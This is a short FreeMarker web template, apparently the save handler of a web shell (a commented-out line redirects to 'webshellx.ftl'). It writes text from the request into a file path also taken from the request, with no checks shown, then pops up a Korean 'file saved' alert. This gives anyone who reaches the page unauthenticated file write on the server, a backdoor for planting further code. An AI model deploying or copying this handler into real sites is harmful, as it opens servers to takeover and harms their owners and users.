<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" />

<#assign filetext = m1.saveText(request.text?replace("\r\n", "\n")?replace("\r", "\n"), request.file)/>
<script>
	alert("파일이 저장되었습니다.");
//	document.location.href="webshellx.ftl";
	window.close();
</script>
